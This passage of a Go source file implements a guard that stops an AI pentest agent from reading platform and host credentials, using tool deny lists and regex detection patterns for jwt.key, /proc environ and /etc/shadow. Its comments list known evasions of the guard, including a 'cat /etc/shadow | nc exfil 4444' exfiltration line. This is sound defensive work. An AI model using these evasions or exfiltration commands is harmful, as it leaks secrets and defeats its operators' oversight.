package guard

import (
	"encoding/json"
	"log"
	"os"
	"regexp"
	"sort"
	"strings"

	"github.com/Autumn-27/artex/intercept"
)

// ============================================================================
// 代码级短路表 —— 红线吸收（artex-hs T02，摘取自 reArtex 限制强化方案 V2 §4
// 的 G-01① 与 G-02①-a）
//
// 设计约束（V2 §6.3「安全类回退键脱离 settings 热改面」）：
//  1. 必须是【代码常量】，不进 DB 规则行、不受任何 settings 键覆盖。
//     理由：settings 热改无校验，持 JWT 者一次 PUT /api/settings 即可整体关闭
//     全部防线（H2-A4）。DB 规则行同理可被 DELETE。
//  2. 求值位置在 applyIntercept 的【最前面】，先于 IsToolEnabled。
//     否则不在 intercept_enabled_tools 名单内的工具会直接放行，本表形同虚设。
//  3. 回滚仅经编译期 feature flag（ShortCircuitEnabled）+ 环境变量 + 重启，
//     不提供运行时开关。
// ============================================================================

// ShortCircuitEnabled 是本表的编译期/环境变量双重闸门。默认启用。
//
// 设为 false（改代码重编译）或 env ARTEX_DISABLE_SHORT_CIRCUIT=1（重启生效，
// 无需重新构建镜像）可整体停用本表。仅限应急回滚——停用后平台退化为
// 「仅 DB 规则」防线，而 DB 规则本身可被持 JWT 者热改（H2-A4）。
var ShortCircuitEnabled = true

// init 读取环境变量开关。放在 init 而非 shortCircuit 内部：env 读取每次调用
// 都做没有意义，且便于启动日志里留下"本表是否生效"的可见痕迹。
func init() {
	disabled, raw := disableFlagFromEnv()
	if disabled {
		log.Printf("[guard] ⚠ 短路表已停用 (ARTEX_DISABLE_SHORT_CIRCUIT=%q)：平台仅剩 DB 规则防线", raw)
	}
}

func disableFlagFromEnv() (bool, string) {
	raw := os.Getenv("ARTEX_DISABLE_SHORT_CIRCUIT")
	if raw == "" {
		return false, ""
	}
	switch strings.ToLower(raw) {
	case "1", "true", "yes", "on":
		ShortCircuitEnabled = false
		return true, raw
	default:
		log.Printf("[guard] ARTEX_DISABLE_SHORT_CIRCUIT=%q 非真值(1/true/yes/on)，短路表保持启用", raw)
		return false, raw
	}
}

// platformDenyTools 比 ask 更严的一档。MCP 注册是凭据汇：stdio 传输会以容器 root
// 拉起任意二进制，http/sse 传输则把 env 字段当 HTTP header 回放。所以「新建 MCP」
// 等价于「让平台对任意地址带任意 header 发请求」，不该由 agent 在测评中途自行开通。
var platformDenyTools = map[string]bool{
	"create_mcp": true,
	"update_mcp": true,
}

// platformAskTools 是 G-01① 的对象：改平台配置的工具一律 ask，不直接 deny —— 建自定义
// 工具 / skill 是 auto agent 的合法日常操作，拦死会废掉平台运维能力。MCP 见上。
//
// create_skill 不在此表：新建技能文件不覆盖既有行为，其后果由动作层护栏兜住
// （护栏拦行为不拦内容，故写进 skill 的内容无法绕过工具层策略），日常操作不该
// 被人工审批打断。它落在 platformAllowTools —— 显式判定放行，不是漏判。
var platformAskTools = map[string]bool{
	"create_custom_tool":    true,
	"update_custom_tool":    true,
	"update_skill_file":     true,
	"delete_assets_by_host": true,
}

// platformAllowTools 是低危面：代码常量【显式判定放行】。
//
// 与「不命中短路表」的区别是本表存在的全部意义：不命中 = 漏判，平台工具
// 就能绕开判官（G-01① 原漏洞）；显式 allow = 平台主动判了「这件事无害」，
// 判定动作照样落审计链。
//
// 收录标准：① 不覆盖既有行为（新建不同于改写）；② 其后果由动作层护栏兜住
// （护栏拦行为不拦内容，故写进 skill 的内容无法绕过工具层策略）。
var platformAllowTools = map[string]bool{
	"create_skill": true,
}

// platformCredentialRe 是 G-02①-a 的对象：只拦 ARTEX 平台自身的凭据。
//
// 收窄依据：agent 的工作目录是 <data>/sessions/<key>，即工作区就落在 data
// 目录里。所以任何"按目录前缀一刀切"（如 /app/data/**/*.key、裸 /\.env\b）
// 都会连带拦掉渗透目标上的证据文件，而 .env 恰恰是渗透最常要读的东西之一。
// 故改为按【具体凭据文件】列举，而不是按目录或扩展名通配。
//
// 已覆盖的平台凭据（0.3.15 实测）：
//
//	/app/jwt.key                     —— 签发管理员 JWT 的签名密钥（现行位置：可执行文件同目录）
//	/app/data/jwt.key                —— 旧版遗留位置（auth.go loadOrCreateJWTKey 的迁移源，
//	                                    未迁移的存量安装里它仍在可浏览工作区）
//	/app/.env                        —— 若日后挂载平台环境文件
//	/app/data/traffic/_ca/*.pem|key|crt —— mitmproxy MITM CA 私钥/证书（traffic.go CaRootPath）
//
// /proc 族：worker 的 Bash 是 server 子进程、同 UID，可读 server 原始环境块，
// 其中含 ANTHROPIC_API_KEY / ARTEX_PG_DSN。只能靠谓词拦（H2-A3）。注意只拦
// environ/cmdline/mem，/proc/net/tcp 等本机侦察手法不受影响。
//
// 【本表的固有上限】这是对工具入参的字符串预筛，不是路径解析级强制。
// `cat $(realpath ../../../jwt.key)` 这类经 shell 展开后才现形的路径绕得过。
// 真正闭合要等 env 白名单 + 执行前 realpath 校验。
var platformCredentialRe = regexp.MustCompile(
	`(?i)(` +
		// 平台签名密钥（现行 + 旧版遗留两处位置）
		`/app/(?:data/)?jwt\.key` +
		`|/app/\.env\b` +
		// MITM CA 私钥/证书
		`|/app/data/traffic/_ca/[^\s"']*\.(?:pem|key|crt)` +
		// 相对路径回溯到平台密钥（cwd 为 /app/data/sessions/<key>：
		// 两层 .. 到 /app/data/jwt.key（旧版遗留位），三层 .. 到 /app/jwt.key）。
		// 少于一层的 ../jwt.key 是同级的会话/目标文件，不该拦。
		`|(?:\.\./){2,}jwt\.key` +
		// /proc 族：任意 PID 的环境块 / 命令行 / 内存。
		// environ 用一条覆盖形态的规则收口：pid 段可以是数字、self、*、
		// [0-9]*、$$ 等任意写法，文件名段也可能是 glob（envi*on）。
		// 只认字面形态的话，cat /proc/*/environ 就绕过去了。
		`|/proc/[^\s"']*envi[^\s"']*` +
		`|/proc/\d+/cmdline` +
		`|/proc/\d+/mem` +
		`)`,
)

// 宽字符类补充规则：覆盖 jwt.key 被插入空白/分隔符的绕过变形
// （如 "/app/j w t . k e y"）。深解码只处理 JSON 转义，对字面插入的
// 空格无效，故此条不是冗余。
//
// 必须带 /app/ 前缀：裸的 `j[\s._-]*w…` 会连渗透目标上名为 jwt.key 的
// 文件一起拦掉，而那可能正是要取的证据。
var platformCredentialLooseRe = regexp.MustCompile(
	`(?i)/app/(?:data/)?j[\s._-]*w[\s._-]*t[\s._-]*\.?[\s._-]*k[\s._-]*e[\s._-]*y`)

// platformConfigBareReadRe 是 V4-D 修复2：worker cwd（<data>/sessions/<key>）下
// 平台注入的配置文件就叫 config.json / .jwt / jwt.key（相对名），实测 #49
// `cat config.json` 被判官按"纯只读 ALLOW"放行——判官 prompt 无法区分相对名
// 读的是工作文件还是平台配置，只能靠代码档收紧。
//
// 【判定收窄与取舍】（任务书裁决，逐条钉在测试里）：
//   - 只拦【读命令】(cat/head/tail/less/more/cp/mv/sed/awk/strings) 后
//     【紧邻第一参数】恰为这三个裸名（可带引号包裹）。
//     `head -5 config.json`（第一参数是 flag）、`cp a config.json`（第二
//     参数位）不拦——按字面执行收窄，宁漏不误伤：worker 工作目录里注入的
//     配置也可能同名，且打靶取证常引用同名靶机文件（/tmp/x/config.json、
//     my_config.json 一律放过，见负向用例）。
//   - 裸名【前】必须是命令边界（行首/空白/引号/`;&|(`/反引号），前接 `/`
//     或字母数字不命中：`cat /tmp/foo/config.json`、`cat my_config.json` 放过。
//     V6-FP2：边界类【恢复含】 `"`/`'`。V6-FP 曾为修 `echo "cat config.json"
//     > /tmp/notes.txt` 误伤把引号移出边界类，副作用是 `bash -c 'cat
//     config.json'` / `eval 'cat config.json'` 这类「读命令紧贴引号」的平台
//     凭据裸读被放行——这是真实绕过，不能留。现恢复引号边界堵住绕过，另在
//     shortCircuit 计算 bareReadHit 前用 maskWriteCommandQuoteArgs 把
//     echo/printf/tee 引号参数里的「数据」屏蔽，仅豁免裸相对名档（详见该函数
//     注释与 shortcircuit_falsepositive_test.go 的 V6-FP2 回归）。
//   - 裸名【后】是词尾边界（行尾/空白/引号/管道重定向等），`cat config.json.bak`
//     放过（`.` 不在尾类里，RE2 无环视故用消费式；这也意味着
//     `cat config.json.orig` 这类备份名不拦——备份文件不是活动凭据，接受）。
//   - echo/输出型命令（非读命令表内）后跟裸名不拦：`echo config.json` 无
//     读取语义。
//
// 与 platformCredentialRe 同为平台凭据档：不吃远程指代豁免（靶机上不存在
// 名为 jwt.key 的平台配置，`ssh x 'cat jwt.key'` 读到的仍可能是本机文件——
// 但那是字符串级判据的固有上限，既有注释已声明）；recordOnlyTools 豁免在
// 调用侧维持不变。已知残留漏判面：shell 变量展开（f=config.json; cat $f）、
// 引号内换行首置等需 realpath 级执行前校验才闭合（V2 G-02①-b 范畴）。
var platformConfigBareReadRe = regexp.MustCompile(
	`(?i)(?:^|[\s"'` + "`" + `;&|(])` +
		`(?:cat|head|tail|less|more|cp|mv|sed|awk|strings)[\s"'` + "`" + `]+` +
		`["']?(?:config\.json|\.jwt|jwt\.key)(?:$|[\s"'` + "`" + `;|&)<>{[=,)])`)

// ============================================================================
// V4-E：heredoc 正文剥离（修 platformConfigBareReadRe 的正文误伤）
//
// 实测问题：agent 用 `cat > /path/result_summary.txt <<'EOF' … [1] cat config.json
// … EOF` 写结果摘要，正文里的「[1] cat config.json」是【数据】（摘要里引用了
// 一条被拦命令的原文），不是要执行的命令，却被 platformConfigBareReadRe 当成
// `cat config.json` 命中 deny——正是 recordOnlyTools 注释里那条「如实记录被拦
// 命令原文不得被误伤」的同类问题，只是换成了 Bash heredoc 这首载体。
//
// 修法：按行扫描，命中 `<<[-]?['"]?NAME['"]?` 后进入正文态，直到出现与分隔符
// 完全相同的行（或输入结束）为止；正文行整段替换为空行（保留行数，便于定位），
// heredoc 起始行与结束标记行本身保留。
//
// 【刻意不对称】只对 platformConfigBareReadRe（裸相对名读）生效。
// platformCredentialRe / platformCredentialLooseRe 维持原文匹配：
// `bash <<EOF … cat /app/jwt.key … EOF` 这类「正文被当命令执行」的路径不能
// 因为剥离而放过，而平台签名密钥是本表存在的理由，宁可保留这档误伤。
//
// 【残余风险（已知上限，诚实声明）】
//  1. `cat <<EOF | bash` 这种「正文经管道喂给解释器」的形态：解释器不在
//     heredoc 起始行，剥离后正文不再参与 platformConfigBareReadRe 匹配 →
//     可绕过裸相对名档。属字符串预筛的固有上限（与 shell 变量展开同源），
//     闭合需 shell AST 或 realpath 级校验。
//  2. 分隔符非标识符形态（如 `<< 'E-O-F'`）不进入剥离，正文照旧参与匹配
//     —— fail-closed 方向（宁可误伤，不放过执行面）。
//  3. 解释器判定见 heredocBodyIsCode 的白名单（bash/sh/zsh/python/eval 等）：
//     未收录的解释器按「正文是数据」处理，同上属可接受漏判。
// ============================================================================

// heredocSpec 是一处 heredoc 起始符的解析结果。
type heredocSpec struct {
	delim string // 结束标记（不含引号）
	dash  bool   // <<- 形态：结束行允许前导 tab
	strip bool   // true=正文是数据，剥离；false=正文当命令（解释器消费），保留
}

// heredocCodeTokens 是「会把正文当代码执行」的命令词白名单（取 basename）。
var heredocCodeTokens = map[string]bool{
	"bash": true, "sh": true, "zsh": true, "dash": true, "ksh": true, "ksh93": true,
	"mksh": true, "ash": true, "fish": true, "csh": true, "tcsh": true,
	"source": true, ".": true, "eval": true,
	"python": true, "python3": true, "perl": true, "ruby": true,
}

// heredocBodyIsCode 判定 heredoc 起始行 prefix（`<<` 之前的部分）是否以
// 「解释器」为消费方——是则正文是代码、不得剥离（`bash <<EOF`、
// `sudo bash <<EOF`、`ssh host bash <<EOF`）。
//
// 只认「命令位」（首个 token 或最后一个 token）命中解释器名：`cat > bash`
// 这种把 bash 当文件名的写法不会被误判（中间位不认），宁漏不误伤方向与
// platformConfigBareReadRe 的收窄纪律一致。
func heredocBodyIsCode(prefix string) bool {
	fields := strings.FieldsFunc(prefix, func(r rune) bool {
		switch r {
		case ' ', '\t', ';', '|', '&', '(', ')', '`', '{', '}':
			return true
		}
		return false
	})
	for i, tok := range fields {
		tok = strings.Trim(tok, `"'`)
		if tok == "" {
			continue
		}
		if k := strings.LastIndexByte(tok, '/'); k >= 0 {
			tok = tok[k+1:]
		}
		if !heredocCodeTokens[strings.ToLower(tok)] {
			continue
		}
		if i == 0 || i == len(fields)-1 {
			return true
		}
	}
	return false
}

func isIdentStartByte(c byte) bool {
	return c == '_' || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
}

func isIdentByte(c byte) bool {
	return isIdentStartByte(c) || (c >= '0' && c <= '9')
}

// scanHeredocSpecs 扫描单行里的全部 heredoc 起始符（引号外的 << 运算符）。
// `<<<` 是 here-string（单行输入，无正文），不进入正文态。
func scanHeredocSpecs(line string) []heredocSpec {
	var specs []heredocSpec
	var inSingle, inDouble bool
	for i := 0; i < len(line); i++ {
		c := line[i]
		switch {
		case inSingle:
			if c == '\'' {
				inSingle = false
			}
			continue
		case inDouble:
			if c == '\\' {
				i++
				continue
			}
			if c == '"' {
				inDouble = false
			}
			continue
		}
		switch c {
		case '\'':
			inSingle = true
		case '"':
			inDouble = true
		case '<':
			if i+1 >= len(line) || line[i+1] != '<' {
				continue
			}
			if i+2 < len(line) && line[i+2] == '<' {
				i += 2 // <<< here-string
				continue
			}
			j := i + 2
			dash := false
			if j < len(line) && line[j] == '-' {
				dash = true
				j++
			}
			var quote byte
			if j < len(line) && (line[j] == '\'' || line[j] == '"') {
				quote = line[j]
				j++
			}
			start := j
			if j >= len(line) || !isIdentStartByte(line[j]) {
				continue
			}
			for j < len(line) && isIdentByte(line[j]) {
				j++
			}
			name := line[start:j]
			if quote != 0 {
				if j >= len(line) || line[j] != quote {
					continue
				}
				j++
			}
			specs = append(specs, heredocSpec{delim: name, dash: dash, strip: !heredocBodyIsCode(line[:i])})
			i = j - 1
		}
	}
	return specs
}

// isHeredocTerminator 判定某行是否为该 heredoc 的结束标记行。<<- 形态允许
// 前导 tab（POSIX）；行尾 \r 一并容忍（仓库有 CRLF 检出）。
func isHeredocTerminator(line string, sp heredocSpec) bool {
	l := strings.TrimSuffix(line, "\r")
	if sp.dash {
		l = strings.TrimLeft(l, "\t")
	}
	return l == sp.delim
}

// stripHeredocBodies 把 heredoc 正文行整段替换为空行（保留行数与起始/结束
// 标记行），供 platformConfigBareReadRe 在「不含数据正文」的文本上匹配。
// 解释器消费的 heredoc（heredocBodyIsCode）正文原样保留。
func stripHeredocBodies(cmd string) string {
	if !strings.Contains(cmd, "<<") {
		return cmd
	}
	lines := strings.Split(cmd, "\n")
	out := make([]string, 0, len(lines))
	i := 0
	for i < len(lines) {
		out = append(out, lines[i])
		specs := scanHeredocSpecs(lines[i])
		i++
		for _, sp := range specs {
			for i < len(lines) {
				body := lines[i]
				i++
				if isHeredocTerminator(body, sp) {
					out = append(out, body)
					break
				}
				if sp.strip {
					out = append(out, "")
				} else {
					out = append(out, body)
				}
			}
		}
	}
	return strings.Join(out, "\n")
}

// jsonStringValuesText 把 JSON 对象的【全部顶层字段】拼成一段真文本（字符串
// 顺带完成 JSON 转义还原，非字符串值按 JSON 序列化）。
//
// 存在的理由：heredoc 剥离是按【行】做的，必须在真文本上做——原始 JSON 字节
// 里换行是字面量 `\n`、`<<` 是 `\u003c\u003c`，按行扫描根本看不见 heredoc
// 起始符。非 JSON（不以 '{' 开头）返回 ok=false，调用方退回原始字节串。
// 键排序保证拼接顺序确定（同一入参多次求值结果一致）。
func jsonStringValuesText(input []byte) (string, bool) {
	if len(input) == 0 || input[0] != '{' {
		return "", false
	}
	var m map[string]any
	if err := json.Unmarshal(input, &m); err != nil {
		return "", false
	}
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var b strings.Builder
	for _, k := range keys {
		switch t := m[k].(type) {
		case string:
			b.WriteString(t)
		case nil:
			// 跳过
		default:
			if enc, err := json.Marshal(t); err == nil {
				b.Write(enc)
			}
		}
		b.WriteByte('\n')
	}
	return b.String(), true
}

// ============================================================================
// V6-FP2：写命令引号参数豁免（收窄 #09 的修复，堵住 bash -c 内联绕过）
//
// 背景：V6-FP 为修 echo 把疑似裸读文本写进 /tmp/notes.txt 的误伤，把
// platformConfigBareReadRe 前置边界类里的双/单引号去掉了。副作用是
// bash -c / sh -c / eval 这类把引号内容当命令执行的形态，其平台凭据裸读
// 被放行——引号里是【要被执行的命令】，不是数据，这是真实绕过，不能留。
// V6-FP2 恢复引号边界（见正则定义处注释），并在此对 echo/printf/tee 的
// 引号参数做屏蔽，使写命令误伤与解释器绕过同时得到正确处理。
//
// 判据（纯函数，无运行时推断）：把待匹配文本按 shell 命令边界切成段，
// 只有【第一个动词】是 echo/printf/tee 的段才把其引号参数视为数据屏蔽；
// bash/sh/eval 等解释器段、以及 cat/head 等读命令段一律不屏蔽。
//
// 刻意只屏蔽【引号参数】，不动命令骨架：重定向目标、&&/; 后的后续命令
// 原样保留，因此 echo x && cat config.json 里的真实读仍会被拦。若改成
// 「整条文本首个动词是写命令就整体跳过该档」，复合命令里的真实读会被
// 一并放过，故取屏蔽而非整体跳过。
//
// 作用面：仅 platformConfigBareReadRe 一档（bareReadHit）。platformCredential
// Re / Loose 与 host 系统凭据档仍按原文匹配，不吃本豁免；stripHeredocBodies
// 与 decodedInputText 两条既有路径同样保持不变（本函数叠加在其后）。
// ============================================================================

// writeCommandVerbs 是「把引号参数当数据输出/写入、不执行」的命令动词。
// 只有这些命令引号里的疑似裸读文本才是被写入的数据，不构成裸读。
var writeCommandVerbs = map[string]bool{
	"echo": true, "printf": true, "tee": true,
}

// maskWriteCommandQuoteArgs 把 text 中 echo/printf/tee 命令段内【引号包裹的
// 参数】替换为等长空白（保留字节数与换行，便于定位与正则边界判定），返回
// 供 platformConfigBareReadRe 匹配的文本。
//
// 引号外的骨架（命令动词、重定向目标、&&/; 连接的后续命令）原样保留；
// 非写命令段（含 bash -c / sh -c / eval / cat 等）整段不屏蔽。
func maskWriteCommandQuoteArgs(text string) string {
	out := []byte(text)
	inSingle, inDouble := false, false
	verbSeen := false // 当前段是否已读到第一个动词
	isWriter := false // 当前段动词是否为 echo/printf/tee
	quoteStart := 0

	maskRange := func(a, b int) {
		for i := a; i < b && i < len(out); i++ {
			if out[i] != '\n' && out[i] != '\r' {
				out[i] = ' '
			}
		}
	}
	endSegment := func(segEnd int) {
		// 未闭合引号：写命令段里把已见的引号内容屏蔽到段末，避免留下半个
		// 疑似裸读文本参与匹配。
		if isWriter && (inSingle || inDouble) {
			maskRange(quoteStart, segEnd)
		}
		inSingle, inDouble = false, false
		verbSeen, isWriter = false, false
	}
	for i := 0; i < len(text); i++ {
		c := text[i]
		if inSingle || inDouble {
			if inDouble && c == '\\' { // 双引号内反斜杠转义下一个字符
				if isWriter {
					maskRange(i, i+2)
				}
				i++
				continue
			}
			closing := (inSingle && c == '\'') || (inDouble && c == '"')
			if isWriter {
				maskRange(i, i+1)
			}
			if closing {
				inSingle, inDouble = false, false
			}
			continue
		}
		switch c {
		case '\'', '"':
			if c == '\'' {
				inSingle = true
			} else {
				inDouble = true
			}
			quoteStart = i
			if isWriter {
				out[i] = ' ' // 开引号也一并屏蔽
			}
		case ';', '&', '|', '\n', '(', ')', '`':
			endSegment(i)
		default:
			if !verbSeen {
				if c == ' ' || c == '\t' {
					continue
				}
				// 取本段第一个动词 token（到空白/分隔符/引号为止），按
				// basename 判定，兼容 /usr/bin/echo 这类带路径写法。
				j := i
				for j < len(text) {
					d := text[j]
					if d == ' ' || d == '\t' || d == ';' || d == '&' || d == '|' ||
						d == '\n' || d == '(' || d == ')' || d == '`' || d == '\'' || d == '"' {
						break
					}
					j++
				}
				verb := text[i:j]
				if k := strings.LastIndexByte(verb, '/'); k >= 0 {
					verb = verb[k+1:]
				}
				isWriter = writeCommandVerbs[strings.ToLower(verb)]
				verbSeen = true
				i = j - 1
			}
		}
	}
	endSegment(len(text))
	return string(out)
}

// ============================================================================
// host 系统凭据档（红线实跑缺陷1 的修复；相对 reArtex 原版为【新增增强】，
// 非回归——已 diff 确认原版 platformCredentialRe 同样只覆盖 ARTEX 平台自身
// 凭据，不含 /etc/shadow 等本机系统凭据）
//
// 保护对象：运行平台自身所在主机（测试者的 Kali/服务器）的系统凭据。
// 平台是渗透测试 agent 平台：读取【靶机】的 /etc/shadow 是合法战果，不能
// 一刀切 deny（intercept/prompt.go 判官策略"纯只读 ALLOW"即为此设计）；
// 被拦的只有【裸本地路径读取】——命令语义指向"本机文件系统"且无任何远程
// 目标指代时，才认定在读平台宿主机的凭据。
//
// 与平台凭据档的【不对称】是有意为之：
//   - platformCredentialRe（/app/jwt.key、config.json、MITM CA、/proc/*）
//     无论上下文一律 deny，【不】套用远程指代豁免——打靶永远不会合法需要
//     读测试者自己容器里的平台签名密钥，`ssh x 'cat /app/jwt.key'` 这种
//     "远程"形态读到的也只可能是本机平台文件（靶机上不存在该路径），一律
//     拦是零误伤的收紧。
//   - 本档保护的是靶机与本机【同名】的路径（/etc/shadow 在哪台机器上都
//     存在），无法靠路径本身区分归属，只能靠"有无远程指代"的语境判据。
//
// 【判据边界与已知上限】（诚实声明，写进测试注释）：
//   - 覆盖：直接命令串、引号/$'...' 包裹、bash -c 内联、glob、宽字符插空
//     等字面形态——只要能在校验文本里"看见"裸本地路径且无远程关键词，即拦。
//   - 不覆盖（字符串预筛的固有上限，与 platformCredentialRe 同源）：
//     脚本文件间接读（先 Write 一个含 cat /etc/shadow 的 .sh 再 bash 执行
//     ——但 Write 类工具入参会命中本档，实际把首跳拦住，残留面是脚本已
//     存在于本机时的一键执行）、shell 变量展开（p=/etc/shadow; cat $p）、
//     编码后解码执行（base64 -d <<<... | bash）。这些要闭合需 realpath 级
//     执行前校验（既有注释里已声明的 V2 G-02①-b 范畴），不在本次修复内。
// ============================================================================

// hostPathStart 是路径【词首边界】：防止靶机战利品复制件（如
// ./loot/etc/shadow——含 /etc/shadow 字面子串，但读的是本机工作区里的
// 证据文件，不是本机系统凭据）被误拦。命中要求路径前是行首/空白/引号/
// 管道重定向等命令边界，即路径是独立参数而非更长工作区路径的尾巴。
// RE2 无环视，只能用消费式边界类；\x60 是反引号（raw string 里不能再写
// 反引号）。
const hostPathStart = `(?:^[\s"'` + "`" + `(&|;<>}{=,:]*|[\s"'` + "`" + `(&|;<>}{=,:])`

// hostPathEnd 是路径【词尾边界】：允许紧随的读取修饰（-备份、.bak、/目录、
// glob 星号、shell 元字符）或行尾，但后面再跟字母数字不拦（/etc/shadowx、
// pg_shadow 不命中，减误伤）。
const hostPathEnd = `(?:[\s.,:;` + "`" + `"'/&|<>}{)\]}*-]|$)`

// hostSystemCredentialRe 命中本机系统凭据的【裸本地路径】形态。
// 路径集（任务书指定 + 同族补齐）：
//
//	/etc/shadow /etc/gshadow            —— 口令哈希（含 shadow-/gshadow- 备份）
//	/etc/sudoers, /etc/sudoers.d/       —— 提权面配置
//	/root/.ssh/<子路径>                 —— 本机 root SSH 私钥/authorized_keys
//	                                     （V6-FP：目录本体 `ls /root/.ssh/`
//	                                     属只读侦察、不泄露私钥，不再命中；
//	                                     只有指向目录下具体文件才拦）
//
// shadow/sudoers 两条允许【字符间插入空白/分隔符】的变形（`/etc/sh a d o w`、
// `/etc/s_u_d_o_e_r_s`），因深解码只处理 JSON 转义、对字面插空无效，严谨度
// 对齐 platformCredentialLooseRe；gshadow 与 /root/.ssh 保持紧凑，控制过拦面。
//
// 注意 【不含】 /etc/passwd：世界可读，打靶与本机侦察都常读，拦它是过拦
// （任务书红线：别过拦）。主机私钥 ssh_host_*key* 单独一条正则处理（.pub
// 公钥要放过，RE2 不支持负环视，拆出去用代码判定）。
var hostSystemCredentialRe = regexp.MustCompile(
	`(?i)(?:` +
		hostPathStart +
		`/etc/s[\s._-]*h[\s._-]*a[\s._-]*d[\s._-]*o[\s._-]*w` + hostPathEnd +
		`|` + hostPathStart + `/etc/gshadow` + hostPathEnd +
		`|` + hostPathStart +
		`/etc/s[\s._-]*u[\s._-]*d[\s._-]*o[\s._-]*e[\s._-]*r[\s._-]*s(?:\.d)?` + hostPathEnd +
		`|` + hostPathStart + `/root/\.ssh/[^\s"'` + "`" + `]+` + hostPathEnd +
		`)`,
)

// sshHostKeyRe 命中 /etc/ssh/ssh_host_* 私钥路径。公钥 .pub 不构成凭据
// 泄露不该拦，但 RE2 没有 (?!\.pub)，命中后在 hostSystemCredentialHit 里
// 用代码检查尾缀过滤。
var sshHostKeyRe = regexp.MustCompile(
	`(?i)` + hostPathStart + `/etc/ssh/ssh_host_[^\s"'` + "`" + `]*key`)

// remoteRefRe 是"远程目标指代"语境判据：命令串里【任意位置】出现任一形态，
// 即认为读取指令与远端靶机有关，host 系统凭据档整体豁免。
//
// 覆盖：ssh/scp/sftp/rsync/nc(ncat)/netcat/proxychains(4/chain) 等远程执行
// 与传输工具、mysql|psql|mariadb 的 -h/--host 形态、winrm/ansible、
// docker|podman|kubectl 的 exec 形态（V6-FP：目标容器内读取属合法战果）、
// 任意 `@<host>`（user@10.1.2.3、root@target，RE2 无环视故消费一个边界
// 字符，避免邮箱串误判）、以及 `http(s)://` URL（URL host 必为远端；含
// @IP 的 curl 上传属打靶外传战利品，任务书明列豁免项）。本机平台面已由
// platformCredentialRe 的 /app 字面独立覆盖，两档相互独立不因此漏。
//
// 设计取舍：按"存在性"而非"位置先后"豁免——`curl -T /etc/shadow
// http://10.0.0.5/`（先本地路径后 URL）必须豁免（任务书豁免组用例），
// 代价是 `cat /etc/shadow | nc exfil 4444`（先本地路径后 nc，外传本机）
// 同样被豁免。字符串级判据无法区分"拿 shadow 去连远端"与"从远端拿
// shadow"的先后语义，这是本档已知残留漏判面（诚实评估见测试注释与交付
// 报告）；闭合要等 shell AST 解析或 realpath 级执行前校验。
//
// 命令位边界：ssh/nc 等动词必须出现在【命令位置】（行首或空白/引号/管道
// 之后）才算远程指代——`\bssh\b` 会把路径尾巴 `/root/.ssh`、`/etc/ssh/`
// 里的 ssh 误认成远程命令，那正是本档要保护的裸读本体，不能豁免。RE2 无
// 环视，用消费式边界类实现。
//
// 靶机名恰好等于本机主机名时也无法靠字符串区分——要求测试者主动拿本机
// 当靶，属自伤场景，接受。
var remoteRefRe = regexp.MustCompile(
	`(?i)(` +
		`(?:^|[\s"'` + "`" + `;&|(<>$])(?:ssh|scp|sftp|rsync|proxychains(?:4|chain)?[0-9]*|netcat|ncat|nc|winrm|ansible)\b` +
		`|(?:^|[\s"'` + "`" + `;&|(<>$])(?:mysql|psql|mariadb)\b[^\n]*?\s-{1,2}h(?:ost)?[=\s]` +
		`|@(?:\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9][a-z0-9._-]*[a-z0-9])(?:[:/'"\s)|,;-]|$)` +
		`|https?://\S` +
		// V6-FP：容器/编排 exec 形态（`docker exec c cat /etc/shadow`）读的是
		// 目标容器内的同名文件，属合法战果，整体豁免 host 档。动词必须在
		// 命令位（复用上面的边界类），避免把 /var/lib/docker/ 这类路径里的
		// docker 字样误认成远程指代。平台凭据档不吃远程豁免（shortCircuit
		// 中平台档先于 host 档求值），`docker exec x cat /app/jwt.key` 仍 deny。
		`|(?:^|[\s"'` + "`" + `;&|(<>$])(?:docker|podman|kubectl)\b[^\n]*?\bexec\b` +
		`)`,
)

// recordOnlyTools 是【纯记录类工具】白名单（红线实跑缺陷2 的豁免对象）：
// 不落盘执行、不触发进程，只把文本写进 DB/证据库。证据文本里引用被拦命令
// 原文（含 /app/jwt.key、/etc/shadow 字样）是审计刚需——"如实记录被拦命令
// 原文"不得被凭据正则误伤，否则 agent 被迫改写措辞、证据失真（实跑已在
// intercept_pending 留下误伤记录）。
//
// 名单来源（以注册名为准，逐一核对，非按前缀猜测）：
//   - record_fact / add_hint / add_intent / prove_goal：agent/tools.go（writeExpTool）
//   - report_finding / goal_met / set_goals / set_constraints：agent/tools.go（writeTool）
//   - update_finding_report / bind_finding_traffic：agent/finding_workflow.go:59
//   - add_task_hint：主 agent 向任务交接提示（平台对话侧无 report_finding，见 tools.go:1272）
//   - insert_assets：资产/证据文本登记
//
// 收录标准：参数是【描述性文本】、执行体仅做 DB 写入。凡能触发进程或文件
// IO 的一律不豁免（Bash、shell_open/shell_send、Read/Write/Edit、http_*、
// nuclei 等），命令执行类照旧全匹配两档凭据正则。
// 显式白名单常量，便于代码审查：豁免了谁、为什么豁免，一屏看全。
var recordOnlyTools = map[string]bool{
	"record_fact":           true,
	"report_finding":        true,
	"update_finding_report": true,
	"add_hint":              true,
	"add_task_hint":         true,
	"add_intent":            true,
	"prove_goal":            true,
	"goal_met":              true,
	"set_goals":             true,
	"set_constraints":       true,
	"insert_assets":         true,
	"bind_finding_traffic":  true,
}

// hostScanFields 是 host 系统凭据档【只扫描】的参数字段：命令体与文件路径。
// 刻意不含 pattern——Grep/search 类工具的 pattern 是正则不是路径，拦
// pattern="shadow" 属大规模过拦；Grep 搜索根固定在会话工作区，读不到
// /etc/shadow 本体。也不含 content/note/description 等正文字段——把
// "战果记录里引用 cat /etc/shadow"误判成本机读取是过拦；真执行面是
// Bash 的 command、Read/Write 的 file_path。
// 注：JSON 字符串值在此顺带完成转义解码（\u002f、\/ 还原为 /），
// 故本档天然覆盖转义绕过，无需再单独解码。
var hostScanFields = []string{"command", "text", "file_path", "path", "args"}

// hostScanText 提取 host 档的校验文本：JSON 对象走字段抽取（顺带完成 JSON
// 转义解码，堵 \u002f 形态），非 JSON 对象退回整体字节串。
func hostScanText(input []byte) string {
	if len(input) == 0 || input[0] != '{' {
		return string(input)
	}
	var m map[string]any
	if err := json.Unmarshal(input, &m); err != nil {
		return string(input)
	}
	var b strings.Builder
	for _, k := range hostScanFields {
		v, ok := m[k]
		if !ok {
			continue
		}
		switch t := v.(type) {
		case string:
			b.WriteString(t)
			b.WriteByte('\n')
		default:
			if enc, err := json.Marshal(v); err == nil {
				b.Write(enc)
